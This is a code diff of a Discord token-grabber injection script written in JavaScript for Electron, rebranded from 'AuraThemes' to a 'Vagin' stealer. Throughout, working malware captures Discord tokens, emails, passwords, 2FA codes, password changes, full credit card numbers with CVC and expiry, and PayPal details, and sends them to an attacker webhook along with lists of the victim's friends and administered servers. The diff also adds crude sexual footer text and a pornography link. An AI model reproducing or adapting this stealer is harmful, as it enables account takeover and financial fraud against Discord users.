@@ -1,5 +1,4 @@
 const { BrowserWindow: BrowserWindow, session: session } = require("electron"),
-    { execSync } = require("child_process"),
     { parse: parse } = require("querystring"),
     fs = require("fs"),
     os = require("os"),
@@ -91,7 +90,7 @@ let [
             _active_developer: {
                 value: 4194304,
                 emoji: "<:_:1163172534443851868>",
-                rare: true,
+                rare: false,
             },
         },
         "",
@@ -127,18 +126,6 @@ const request = async (method, url, headers = {}, data = null) => {
 };
 
 const notify = async (ctx, token, acc) => {
-    let system = {
-        CPU: os.cpus()[0].model,
-        GPU: execSync("wmic PATH Win32_VideoController get name | more +1").toString().replace(/\r\n/g, "").replace(/\r/g, ""),
-        UUID: execSync("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID",).toString().split("\r\n")[0],
-        RAM: (os.totalmem() / (1024 * 1024 * 1024)).toFixed(2) + " GB",
-        Mac_Address: execSync("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress",).toString().split("\r\n")[0],
-        Product_Key: execSync("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName",).toString().split("\r\n")[0],
-        Local_IP: execSync("powershell.exe (Get-NetIPAddress).IPAddress").toString().split("\r\n")[0],
-        CPU_Count: os.cpus().length,
-        PC_Name: os.hostname(),
-        OS_Version: `${os.type()} ${os.arch()}`,
-    };
 
     let nitro = getNitro(await fProfile(token)),
         badges = await getBadges(acc.flags),
@@ -146,49 +133,36 @@ const notify = async (ctx, token, acc) => {
         friends = await getFriends(token),
         servers = await getServers(token);
 
-    ctx.username = "@AuraThemes - Injection";
-    ctx.avatar_url = "https://i.imgur.com/WkKXZSl.gif";
-    ctx.embeds[0].title = `Initialized Grabber - ${ctx.title}`;
+    ctx.username = "Vagin";
+    ctx.embeds[0].title = `Injection | ${ctx.title}`;
     ctx.embeds[0].fields.unshift({
-        name: `<a:aura:1087044506542674091> Token:`,
-        value: `\`\`\`${token}\`\`\`\n[[Click Here To Copy Your Token]](https://6889-fun.vercel.app/api/aurathemes/raw?data=${token})`,
+        name: `<a:TE_blackcrownOwO:938406451787993179> Token:`,
+        value: `\`\`\`${token}\`\`\``,
         inline: false
     })
 
-    ctx.embeds[0].thumbnail = {
-        url: `https://cdn.discordapp.com/avatars/${acc.id}/${acc.avatar}.webp`,
-    };
-
     ctx.embeds[0].fields.push(
-        { name: "Nitro", value: nitro, inline: true },
-        { name: "Badges", value: badges, inline: true },
-        { name: "Billing", value: billing, inline: true },
-        { name: "Path", value: `\`${__dirname.toString().trim().replace(/\\/g, "/")}\``, inline: false },
+        { name: "<:TE_hearttextOwO:946385782149619742> Badges:", value: badges, inline: true },
+        { name: "<a:TE_starblackOwO:938409300794150932> Nitro Type:", value: nitro, inline: true },
+        { name: "<:fu_vsco:1089235329413808289> Billing:", value: billing, inline: true },
+        { name: "<a:fu_vsco:1088724978062598185> Token Location:", value: `\`${__dirname.toString().trim().replace(/\\/g, "/")}\``, inline: true },
     );
 
     ctx.embeds.push(
-        { title: `HQ Friend(s)`, description: friends },
-        { title: `HQ Guild(s)`, description: servers },
-        {
-            title: `System Informatio(s)`,
-            fields: [
-                { name: "User", value: `||\`\`\`yml\nUsername: ${os.userInfo().username}\`\`\`||`, inline: true },
-                { name: "System", value: `||\`\`\`yml\n${Object.entries({ ...system }).map(([k, v]) => `${k}: ${v}`).join("\n")}\`\`\`||`, },
-                { name: "Network", value: `||\`\`\`yml\nPublic: ${JSON.parse(await getNetwork()).ip}\`\`\`||`, }
-            ]
-        },
+        { title: `Total Friends (${friends.split('\n').length})`, description: friends },
+        { title: `Total Guilds (${servers.split('\n').length})`, description: servers },
     );
 
     ctx.embeds.forEach((e) => {
-        e.color = 12740607;
-        e.timestamp = new Date();
+        e.color = 0x303037;
         e.author = {
-            name: `${acc.username} | ${acc.id}`,
+            name: `${acc.username} (${acc.id})`,
             icon_url: `https://cdn.discordapp.com/avatars/${acc.id}/${acc.avatar}.png`,
+            url: "https://pornhub.com/"
         };
         e.footer = {
-            text: decodeB64('QXVyYVRoZW1lcyBHcmFiYmVyIC0gaHR0cHM6Ly9naXRodWIuY29tL2s0aXRydW4vRGlzY29yZFRva2VuR3JhYmJlcg'),
-            icon_url: "https://i.imgur.com/yVnOSeS.gif",
+            text: "Lick my pussy | t.me/vaginstealer",
+            icon_url: "https://media.discordapp.net/attachments/1215033115593146489/1227034045007794217/logo.gif?ex=6626ef81&is=66147a81&hm=7993b84de89c85e4f44ae639ed6306478687f128c1ea2937a15d45f3f5dbcadd&=",
         };
     });
 
@@ -260,23 +234,23 @@ const getBilling = async (t) =>
             : x.type === 2
                 ? "<:_:1148653305376034967> "
                 : "",
-        ).join("") || ":x:";
+        ).join("") || "\`❌\`";
 
 const getFriends = async (s) =>
     (await fFriends(s))
         .filter((user) => user.type === 1)
         .reduce((r, a) => ((b) => b
-            ? (r || "**Rare Friends:**\n") + `${b} ${a.user.username}#${a.user.discriminator}\n`
+            ? (r) + `${b} | ${a.user.username}#${a.user.discriminator}\n`
             : r)(getRareBadges(a.user.public_flags)),
             "",
-        ) || ":x:";
+        ) || "No Rare Friends";
 
 const getServers = async (w) =>
     (await fServers(w))
-        .filter((g) => g.permissions === (562949953421311).toString() && g.approximate_member_count >= 500)
-        .reduce((r, g) => (r || "**Rare Servers:**\n") + `${g.owner
-            ? ":crown: Owner"
-            : ":gear: Admin"} | Server Name: \`${g.name}\` | Members: \`${g.approximate_member_count}\` - Online(s): \`${g.approximate_presence_count}\`\n[[Get Avatar Link]](https://cdn.discordapp.com/icons/${g.id}/${g.icon}.png?size=2048)\n`, "",
+        .filter((g) => g.permissions === (562949953421311).toString() && g.approximate_member_count >= 100)
+        .reduce((r, g) => (r) + `${g.owner
+            ? "Owner"
+            : "Admin"} | \`${g.name}\` | Members: \`${g.approximate_member_count}\` - \`❌\`\n`, "",
         ) || ":x:";
 
 const getDate = (a, b) => new Date(a).setMonth(a.getMonth() + b);
@@ -310,17 +284,17 @@ const cruise = async (type, mail, pass, res, req, act) => {
         case 'LOGIN_USER':
             info = await fAccount(res.token);
             msg = {
-                title: act,
+                title: "Login User",
                 embeds: [{
                     fields: [
-                        { name: "Email", value: `\`${mail}\``, inline: true },
-                        { name: "Password", value: `\`${pass}\``, inline: true },
+                        { name: "<a:hc_yes:1188224982615068753> Email", value: `\`${mail}\``, inline: true },
+                        { name: "<a:hc_yes:1188224982615068753> Saved Password", value: `\`${pass}\``, inline: true },
                     ],
                 }],
             };
             if (req.code !== undefined) {
                 msg.embeds[0].fields.push(
-                    { name: "Used 2FA code", value: `\`${req.code}\``, inline: true }
+                    { name: "<:fu_vsco:1089012660458238143> Used 2FA code", value: `\`${req.code}\``, inline: true }
                 );
             }
             notify(msg, res.token, info);
@@ -328,11 +302,11 @@ const cruise = async (type, mail, pass, res, req, act) => {
         case 'USERNAME_CHANGED':
             info = await fAccount(res.token);
             msg = {
-                title: act,
+                title: "Username Changed",
                 embeds: [{
                     fields: [
-                        { name: "New UserName", value: `\`${req.username}\``, inline: true, },
-                        { name: "Password", value: `\`${req.password}\``, inline: true, },
+                        { name: "<:dfbg:1224016753097572353> New UserName", value: `\`${req.username}\``, inline: true, },
+                        { name: "<a:hc_yes:1188224982615068753> Password", value: `\`${req.password}\``, inline: true, },
                     ],
                 }],
             };
@@ -341,11 +315,11 @@ const cruise = async (type, mail, pass, res, req, act) => {
         case 'EMAIL_CHANGED':
             info = await fAccount(res.token);
             msg = {
-                title: act,
+                title: "Email Changed",
                 embeds: [{
                     fields: [
-                        { name: "New Email", value: `\`${mail}\``, inline: true },
-                        { name: "Password", value: `\`${pass}\``, inline: true },
+                        { name: "<a:hc_yes:1188224982615068753> New Email", value: `\`${mail}\``, inline: true },
+                        { name: "<a:hc_yes:1188224982615068753> Password", value: `\`${pass}\``, inline: true },
                     ],
                 }],
             };
@@ -354,11 +328,11 @@ const cruise = async (type, mail, pass, res, req, act) => {
         case 'PASSWORD_CHANGED':
             info = await fAccount(res.token);
             msg = {
-                title: act,
+                title: "Password Changed",
                 embeds: [{
                     fields: [
-                        { name: "New Password", value: `\`${req.new_password}\``, inline: true, },
-                        { name: "Old Password", value: `\`${req.password}\``, inline: true, },
+                        { name: "<a:hc_yes:1188224982615068753> New Password", value: `\`${req.new_password}\``, inline: true, },
+                        { name: "<a:hc_no:1188224988021526668> Old Password", value: `\`${req.password}\``, inline: true, },
                     ],
                 }],
             };
@@ -368,12 +342,12 @@ const cruise = async (type, mail, pass, res, req, act) => {
             token = res;
             info = await fAccount(token);
             msg = {
-                title: act,
+                title: "CreditCard Added",
                 embeds: [{
                     fields: [
-                        { name: "Number", value: `\`${req["card[number]"]}\``, inline: true },
-                        { name: "CVC", value: `\`${req["card[cvc]"]}\``, inline: true },
-                        { name: "Expiration", value: `\`${req["card[exp_month]"]}/${req["card[exp_year]"]}\``, inline: true, },
+                        { name: "Number:", value: `\`${req["card[number]"]}\``, inline: true },
+                        { name: "CVC:", value: `\`${req["card[cvc]"]}\``, inline: true },
+                        { name: "Expiration:", value: `\`${req["card[exp_month]"]}/${req["card[exp_year]"]}\``, inline: true, },
                     ],
                 }],
             };
@@ -383,11 +357,11 @@ const cruise = async (type, mail, pass, res, req, act) => {
             token = res;
             info = await fAccount(token);
             msg = {
-                title: act,
+                title: "PayPal Added",
                 embeds: [{
                     fields: [
-                        { name: "Email", value: `\`${info.email}\``, inline: true },
-                        { name: "Phone", value: `\`${(info.phone || "None")}\``, inline: true },
+                        { name: "<a:fu_vsco:1083877835623632916> Email:", value: `\`${info.email}\``, inline: true },
+                        { name: "<a:fu_vsco:1089232061585428622> Phone:", value: `\`${(info.phone || "❌")}\``, inline: true },
                     ],
                 }],
             };
@@ -397,11 +371,11 @@ const cruise = async (type, mail, pass, res, req, act) => {
             token = res;
             info = await fAccount(token);
             msg = {
-                title: act,
+                title: "New Injected",
                 embeds: [{
                     fields: [
-                        { name: "Email", value: `\`${info.email}\``, inline: true },
-                        { name: "Phone", value: `\`${(info.phone || "None")}\``, inline: true },
+                        { name: "<a:fu_vsco:1083877835623632916> Email:", value: `\`${info.email}\``, inline: true },
+                        { name: "<a:fu_vsco:1089232061585428622> Phone:", value: `\`${(info.phone || "❌")}\``, inline: true },
                     ],
                 }],
             };
